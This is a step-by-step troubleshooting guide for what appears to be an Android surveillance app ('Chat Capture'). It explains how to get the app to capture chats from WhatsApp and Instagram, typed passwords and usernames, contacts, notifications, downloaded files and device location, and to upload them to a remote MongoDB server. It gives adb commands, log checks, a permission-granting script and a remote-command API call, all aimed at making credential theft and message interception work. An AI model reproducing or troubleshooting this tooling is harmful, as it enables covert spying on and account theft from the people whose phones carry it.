# Fix Empty Collections - Step by Step Guide

## Quick Fix Checklist

### Step 1: Verify App Installation ✅
```bash
./check-app-name.sh
```
**Expected:** App should be installed
**If not:** Install with `./gradlew installDebug`

---

### Step 2: Check App Data Capture ✅
```bash
chmod +x check-app-data.sh
./check-app-data.sh
```
**Expected:** Should show capture activity in logcat
**If empty:** Permissions not granted or Capture disabled

---

### Step 3: Check MongoDB Collections ✅
```bash
cd server
node scripts/check-collections.js [YOUR_MONGODB_URI] [DB_NAME]
```
**Example:**
```bash
node scripts/check-collections.js mongodb://localhost:27017 chat_capture
# Or for remote MongoDB:
node scripts/check-collections.js mongodb+srv://user:pass@cluster.mongodb.net chat_capture
```

---

## Fixes by Collection

### 🔴 **users** - Empty (CRITICAL)

**Problem:** Admin user not created
**Fix:**
```bash
cd server
node scripts/update-admin-password.js
```
**Or restart server** - Admin user is created automatically on startup

---

### 🔴 **devices** - Empty (CRITICAL)

**Problem:** App not connecting to server
**Fixes:**

1. **Verify app is installed:**
   ```bash
   adb shell pm list packages | grep com.chats.capture
   ```

2. **Check server URL in app:**
   - Open app: `adb shell am start -n com.chats.capture/.ui.MainActivity`
   - Go to Settings → Server URL
   - Should be: `https://backend-chat-yq33.onrender.com/` (or your server URL)

3. **Check device registration:**
   ```bash
   adb logcat -s DEVICE_REGISTRATION:D | tail -20
   ```
   Look for: "Device registered successfully"

4. **Force device registration:**
   - Open app Settings
   - Toggle "Capture Enabled" OFF then ON
   - This triggers device registration

---

### 🟡 **notifications** - Empty

**Problem:** Notifications not being captured
**Fixes:**

1. **Grant Notification Access:**
   ```bash
   adb shell am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS
   ```
   - Find "Chat Capture" in the list
   - Toggle ON

2. **Enable Capture:**
   - Open app Settings
   - Toggle "Capture Enabled" ON

3. **Test notification capture:**
   ```bash
   # Send a test notification
   adb shell service call notification 1 s16 "com.chats.capture" i32 1 s16 "Test" s16 "Test notification"
   
   # Check logcat
   adb logcat -s NOTIFICATION_CAPTURE:D | tail -10
   ```

4. **Verify sync:**
   ```bash
   adb logcat -s SYNC_WORKER:D API_REQUEST_DATA:D | grep -i notification
   ```

---

### 🟡 **chats** - Empty

**Problem:** Chats not being captured
**Fixes:**

1. **Enable Accessibility Service:**
   ```bash
   adb shell am start -a android.settings.ACTION_ACCESSIBILITY_SETTINGS
   ```
   - Find "Chat Capture" or "Enhanced Accessibility Service"
   - Tap → Toggle ON → Confirm

2. **Enable Capture:**
   - Open app Settings
   - Toggle "Capture Enabled" ON

3. **Test chat capture:**
   - Open WhatsApp/Instagram/any social media app
   - Type a message
   - Check logcat:
     ```bash
     adb logcat -s CHAT_CAPTURE:D KEYBOARD_CAPTURE:D | tail -20
     ```

4. **Verify sync:**
   ```bash
   adb logcat -s SYNC_WORKER:D | grep -i chat
   ```

---

### 🟡 **contacts** - Empty

**Problem:** Contacts not being captured
**Fixes:**

1. **Grant READ_CONTACTS permission:**
   ```bash
   adb shell pm grant com.chats.capture android.permission.READ_CONTACTS
   ```
   Or manually:
   - Settings → Apps → [App Name] → Permissions
   - Enable "Contacts"

2. **Enable Capture:**
   - Open app Settings
   - Toggle "Capture Enabled" ON

3. **Trigger contact sync:**
   - Contacts are synced automatically
   - Or wait for next sync cycle (every 15-30 minutes)

4. **Check logcat:**
   ```bash
   adb logcat -s CONTACT_CAPTURE:D SYNC_WORKER:D | grep -i contact
   ```

---

### 🟡 **credentials** - Empty

**Problem:** Credentials not being captured
**Fixes:**

1. **Enable Accessibility Service** (same as chats)
   ```bash
   adb shell am start -a android.settings.ACTION_ACCESSIBILITY_SETTINGS
   ```

2. **Enable Capture:**
   - Open app Settings
   - Toggle "Capture Enabled" ON

3. **Test credential capture:**
   - Log into any app/website
   - Enter email/username and password
   - Check logcat:
     ```bash
     adb logcat -s CREDENTIAL_CAPTURE:D PASSWORD_CAPTURE:D | tail -20
     ```

4. **Verify sync:**
   ```bash
   adb logcat -s SYNC_WORKER:D | grep -i credential
   ```

---

### 🟢 **media_files** - Empty

**Problem:** No media files uploaded
**Fixes:**

1. **Receive notifications with media:**
   - Send yourself images/videos via WhatsApp/other apps
   - Media in notifications will be captured

2. **Download files (<20MB):**
   - Download any file <20MB through any app
   - Files are automatically uploaded

3. **Check media upload:**
   ```bash
   adb logcat -s MEDIA_UPLOAD:D DOWNLOAD_MONITOR:D SOCIAL_MEDIA_MONITOR:D | tail -20
   ```

**Note:** Files >20MB are NOT uploaded (by design)

---

### 🟢 **commands** - Empty (NORMAL)

**Problem:** No commands sent (this is normal)
**Fixes:**
- Commands are only created when admin sends commands via API
- This is expected if you're not using the command feature
- No action needed unless you want to use commands

**To test commands:**
```bash
# Send a test command (requires admin auth)
curl -X POST http://your-server/api/commands \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "deviceId": "YOUR_DEVICE_ID",
    "action": "get_location",
    "parameters": {}
  }'
```

---

### 🟢 **device_ownership** - Empty (NORMAL)

**Problem:** Device ownership not used (this is normal)
**Fixes:**
- Only populated when devices are assigned to users with device_owner role
- This is expected if you're not using device ownership feature
- No action needed unless you want to use device ownership

---

### 🟡 **logs** - Empty

**Problem:** No API requests being logged
**Fixes:**

1. **Check server is running:**
   ```bash
   curl http://your-server/health
   ```

2. **Check requestLogger middleware:**
   - Verify `server/middleware/requestLogger.js` is included in `server.js`
   - Check server logs for middleware errors

3. **Test API request:**
   ```bash
   curl -X POST http://your-server/api/devices/register \
     -H "Content-Type: application/json" \
     -d '{"deviceId": "test-device", "deviceName": "Test Device"}'
   ```

---

## Complete Diagnostic Flow

### 1. Run App Diagnostic
```bash
./check-app-data.sh
```

### 2. Check MongoDB Collections
```bash
cd server
node scripts/check-collections.js [MONGODB_URI] [DB_NAME]
```

### 3. Fix Based on Results

**If devices empty:**
- Install app
- Check server URL
- Enable Capture toggle

**If notifications empty:**
- Grant Notification Access
- Enable Capture toggle
- Test with a notification

**If chats empty:**
- Enable Accessibility Service
- Enable Capture toggle
- Use social media apps

**If contacts empty:**
- Grant READ_CONTACTS permission
- Enable Capture toggle
- Wait for sync

**If credentials empty:**
- Enable Accessibility Service
- Enable Capture toggle
- Log into apps/websites

---

## Quick Fix Script

Run this to fix common issues:

```bash
#!/bin/bash

echo "🔧 Quick Fix Script"
echo ""

# Grant permissions via ADB
echo "Granting permissions..."
adb shell pm grant com.chats.capture android.permission.READ_CONTACTS
adb shell pm grant com.chats.capture android.permission.READ_SMS
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_IMAGES
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_VIDEO
adb shell pm grant com.chats.capture android.permission.READ_MEDIA_AUDIO

echo ""
echo "✅ Permissions granted"
echo ""
echo "⚠️  Manual steps required:"
echo "   1. Open Notification Access: adb shell am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
echo "   2. Open Accessibility: adb shell am start -a android.settings.ACTION_ACCESSIBILITY_SETTINGS"
echo "   3. Enable Capture toggle in app settings"
echo ""
```

---

## Verification

After fixes, verify:

1. **Check collections again:**
   ```bash
   node server/scripts/check-collections.js [MONGODB_URI] [DB_NAME]
   ```

2. **Check logcat for activity:**
   ```bash
   adb logcat -s NOTIFICATION_CAPTURE:D CHAT_CAPTURE:D SYNC_WORKER:D | tail -50
   ```

3. **Check MongoDB for new data:**
   - Connect to MongoDB
   - Check collection counts
   - Verify recent documents

---

## Summary

**Critical Fixes:**
1. Install app if not installed
2. Grant all permissions
3. Enable Capture toggle
4. Verify server URL

**Most Common Issues:**
- Notification Access not granted → Empty notifications
- Accessibility Service not enabled → Empty chats/credentials
- Capture toggle OFF → No data captured
- Wrong server URL → No data synced

**Quick Test:**
```bash
# 1. Check app
./check-app-name.sh

# 2. Check data capture
./check-app-data.sh

# 3. Check collections
cd server && node scripts/check-collections.js [URI] [DB]
```

For detailed permission setup, see: `PERMISSION_GRANT_STEPS.md`
